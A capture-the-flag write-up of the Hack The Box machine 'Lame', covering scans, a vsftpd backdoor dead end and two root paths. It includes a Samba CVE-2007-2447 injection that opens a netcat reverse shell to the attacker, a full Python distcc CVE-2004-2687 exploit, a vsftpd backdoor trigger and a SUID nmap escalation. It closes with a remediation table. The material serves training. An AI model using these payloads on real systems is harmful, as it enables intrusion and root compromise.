# Lame — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | 🐧 Linux (Ubuntu / Debian) |
| **Difficulty** | 🟢 Easy |
| **Owned** | 07/09/2026 |
| **Author** | Maksym S |

> ⚠️ Retired machine. Flags are redacted (`HTB{__REDACTED__}`) in line with the HTB Terms of Service.

---

## 📌 Summary

**Lame** is one of the oldest boxes on Hack The Box and a rite of passage for anyone starting
out. It runs a stack of end-of-life services, and there are **two clean paths to root**:

1. **Samba `username map script` command injection (CVE-2007-2447)** → **direct root shell**. *(recommended / cleanest)*
2. **distcc daemon command execution (CVE-2004-2687)** → shell as `daemon` → **SUID `nmap`** → root.

It also carries a famous **trap**: `vsftpd 2.3.4`, which usually implies the well-known
backdoor (CVE-2011-2523) — but on Lame that path is a **dead end** (the backdoor port is
filtered). Recognising that rabbit hole is part of the lesson.

**Attack path (recommended):** `Samba 3.0.20 → CVE-2007-2447 → root`

---

## 🔍 1. Reconnaissance

### Port scan

```bash
nmap -p- --min-rate 5000 -oA nmap/all-tcp 10.129.66.131
nmap -p 21,22,139,445,3632 -sVC -oA nmap/services 10.129.66.131
```

**Open ports:**

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```

**Host scripts:**

```
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   Domain name: hackthebox.gr
|_  FQDN: lame.hackthebox.gr
| smb-security-mode:
|   account_used: guest
|_  message_signing: disabled (dangerous, but default)
```

| Port | Service | Version | Why it matters |
|-----:|---------|---------|----------------|
| 21   | ftp     | vsftpd 2.3.4 | Anonymous login allowed; famous backdoor version — **but a trap here** |
| 22   | ssh     | OpenSSH 4.7p1 | Old, but no credentials yet — park it |
| 139/445 | smb  | Samba 3.0.20-Debian | **`username map script` RCE (CVE-2007-2447)** |
| 3632 | distccd | v1 (GNU 4.2.4) | **distcc RCE (CVE-2004-2687)** |

**Takeaway:** three separate exploitable services on one host. Before firing anything, note
that Samba 3.0.20 and distccd 3.1-or-earlier are both directly RCE-able — that shapes the plan.

---

## 🧭 2. Enumeration

### FTP (21) — vsftpd 2.3.4

Anonymous login is allowed:

```bash
ftp 10.129.66.131      # user: anonymous, blank password
```

```
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

The share is empty, and — importantly — the **vsftpd 2.3.4 backdoor (CVE-2011-2523)** does
**not** work on Lame: sending a username ending in `:)` is supposed to open a root bind shell
on TCP **6200**, but that port is **filtered** here, so the connect-back never lands.

> 🪤 **Rabbit hole flagged.** The version screams "backdoor," and that instinct is correct in
> general — it just doesn't pay off on this box. Confirm, move on, don't sink an hour into it.

For reference, this is what the backdoor trigger looks like (it will *hang* on Lame):

```python
# vsFTPd 2.3.4 backdoor trigger (CVE-2011-2523) — does NOT work on Lame (port 6200 filtered)
user     = "USER nergal:)"
password = "PASS pass"
tn = Telnet(host, 21)
tn.read_until(b"(vsFTPd 2.3.4)")
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.")
tn.write(password.encode('ascii') + b"\n")
# backdoor would listen on TCP/6200 — but it's firewalled off on this target
```

### SMB (139/445) — Samba 3.0.20-Debian

List shares with a null session, then connect to a share as **guest** (empty username, no
password) to browse it without credentials:

```bash
smbclient -L //10.129.66.131/ -N            # list shares (null session)
smbclient //10.129.66.131/tmp -U "" -N       # connect to a share as guest
```

```
LAME  Wk Sv PrQ Unx NT SNT  lame server (Samba 3.0.20-Debian)
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03
```

**Samba 3.0.20** is the golden ticket. Versions 3.0.20 through 3.0.25rc3 with the
`username map script` option enabled allow **arbitrary command execution via a crafted
username** — no authentication required. This is **CVE-2007-2447**.

### distcc (3632)

Nmap's NSE script confirms the distcc daemon is exploitable:

```bash
sudo nmap -p3632 --script distcc-cve2004-2687 10.129.66.131
```

```
| distcc-cve2004-2687:
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687   Risk factor: High  CVSSv2: 9.3
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Note the command runs as **`daemon`** — so this path needs a privilege-escalation step
afterwards, unlike the Samba path which lands as root immediately.

---

## 🎯 3. Foothold

### ✅ Path A (recommended): Samba `username map script` — CVE-2007-2447 → root

When `username map script` is set, Samba passes the username to a shell without sanitising it.
By embedding a command inside the username (` `` ` backticks), we get code execution as the
Samba process owner — which on this box is **root**. This is done manually, no Metasploit
required (OSCP-friendly).

**1. Start a listener.** A plain `nc -lvnp 4444` works, but I use
[**Penelope**](https://github.com/brightio/penelope) — it auto-upgrades the incoming shell to
a full PTY, manages sessions, and logs everything:

```bash
penelope -p 4444       # or: nc -lvnp 4444
```

**2. Trigger the injection via `smbclient`** — the payload lives in the username:

```bash
smbclient //10.129.66.131/tmp -N \
  -c 'logon "/=`nohup nc -e /bin/sh 10.10.14.64 4444`"'
```

**3. Catch the shell:**

```
connect to [10.10.14.64] from (UNKNOWN) [10.129.66.131]
id
uid=0(root) gid=0(root)
```

That's **root directly** — no escalation needed. This is the intended, most reliable solution.

---

### 🔁 Path B (alternative): distcc — CVE-2004-2687 → `daemon`

The distcc daemon trusts compilation jobs and executes attacker-supplied commands. Below is
a standalone PoC (no Metasploit) — a port of ExploitDB #9915, kept for OSCP practice.

**Usage:**

```bash
# listener
nc -lvnp 1403

# fire the exploit — command runs as user `daemon`
./distccd_exploit.py -t 10.129.66.131 -p 3632 -c "nc 10.10.14.64 1403 -e /bin/sh"
```

<details>
<summary>📜 <code>distccd_exploit.py</code> (click to expand)</summary>

```python
# -*- coding: utf-8 -*-
# distccd v1 RCE (CVE-2004-2687) — manual port of ExploitDB #9915 (OSCP style)
# Original: Jean-Pierre LESUEUR (@DarkCoderSc)
import socket, string, random, argparse

def rand_text_alphanumeric(n):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

def read_std(s):
    s.recv(4)                       # ignore
    length = int(s.recv(8), 16)     # output length
    if length:
        return s.recv(length)

def exploit(command, host, port):
    args = ["sh", "-c", command, "#", "-c", "main.c", "-o", "main.o"]
    payload = "DIST00000001" + "ARGC%.8x" % len(args)
    for arg in args:
        payload += "ARGV%.8x%s" % (len(arg), arg)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.setdefaulttimeout(5); s.settimeout(5)
    if s.connect_ex((host, port)) == 0:
        print("[OK] Connected to remote service")
        try:
            s.send(payload.encode('utf-8'))
            dtag = "DOTI0000000A" + rand_text_alphanumeric(10)
            s.send(dtag.encode('utf-8'))
            s.recv(24)
            for label in ("STDERR", "STDOUT"):
                buff = read_std(s)
                if buff:
                    print(f"--- {label} ---\n{buff}")
            print("[OK] Done.")
        except socket.error as e:
            print(f"[KO] Socket error: {e}")
        finally:
            s.close()
    else:
        print("[KO] Failed to connect to %s:%d" % (host, port))

parser = argparse.ArgumentParser(description='DistCC Daemon - Command Execution')
parser.add_argument('-t', dest="host", required=True, help="Target IP/HOST")
parser.add_argument('-p', dest="port", type=int, default=3632, help="distccd port")
parser.add_argument('-c', dest="command", default="id", help="Command to run")
argv = parser.parse_args()
exploit(argv.command, argv.host, argv.port)
```

</details>

Result:

```
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Now we need to escalate `daemon` → `root`.

---

## ⬆️ 4. Privilege Escalation (Path B: `daemon` → root)

Enumerate SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/usr/bin/nmap` is **SUID root** and — on this ancient version — ships an **interactive mode**
that can spawn a shell. That shell inherits the SUID owner: **root**.

```bash
nmap --interactive
nmap> !sh
sh-3.2# id
uid=1(daemon) gid=1(daemon) euid=0(root) groups=1(daemon)
sh-3.2# whoami
root
```

Root achieved via the classic `GTFOBins` SUID-`nmap` technique.

---

## 🚩 Proof

```
user.txt: HTB{__REDACTED__}
root.txt: HTB{__REDACTED__}
```

**Users of interest found on the box:** `root`, `user`, `makis`, `postgres`, `tomcat55`.

---

## 🧠 Lessons Learned

- **Version enumeration is everything.** Every foothold on Lame came straight from a service
  banner (`Samba 3.0.20`, `distccd v1`, `vsftpd 2.3.4`). Map versions → known CVEs first.
- **Prefer the path that lands highest.** Samba `usermap_script` gives root *directly*; the
  distcc path only gives `daemon` and needs a second step. When you have options, pick the one
  with the shortest chain — but knowing *both* is what the OSCP rewards.
- **A scary banner isn't always a win.** `vsftpd 2.3.4` looks like an instant backdoor, but the
  port was filtered. Verify quickly, then abandon rabbit holes without ego.
- **SUID binaries are a first-stop for Linux privesc.** `find / -perm -4000` + [GTFOBins](https://gtfobins.github.io/)
  is a reflex you'll use on nearly every Linux box.
- **Enumerate SMB with a null/guest session first.** `smbclient //IP/share -U "" -N` browses
  shares with no credentials — often the fastest way to find a foothold or loot.
- **Use a real shell handler.** [Penelope](https://github.com/brightio/penelope) auto-upgrades
  catches to a full PTY and manages multiple sessions — far less painful than raw `nc`.

---

## 🛡️ Remediation

| Finding | Severity | Fix |
|---------|:--------:|-----|
| Samba `username map script` RCE (CVE-2007-2447) | 🔴 Critical | Upgrade Samba; remove `username map script` from `smb.conf` |
| distcc arbitrary command execution (CVE-2004-2687) | 🔴 Critical | Restrict distccd to trusted hosts (`--allow`), or disable the service |
| vsftpd 2.3.4 (EOL) + anonymous FTP | 🟠 High | Upgrade FTP daemon; disable anonymous access |
| SUID `nmap` with interactive mode | 🟠 High | Remove SUID bit (`chmod u-s`); patch to a modern nmap |
| SMB message signing disabled | 🟡 Medium | Enforce SMB signing |

---

## 🔗 References

- [CVE-2007-2447 — Samba `username map script`](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
- [CVE-2004-2687 — distcc daemon command execution](https://nvd.nist.gov/vuln/detail/CVE-2004-2687)
- [CVE-2011-2523 — vsftpd 2.3.4 backdoor](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [ExploitDB #9915 — distccd RCE](https://www.exploit-db.com/exploits/9915)
- [distcc PoC gist (DarkCoderSc)](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)
- [GTFOBins — nmap](https://gtfobins.github.io/gtfobins/nmap/)
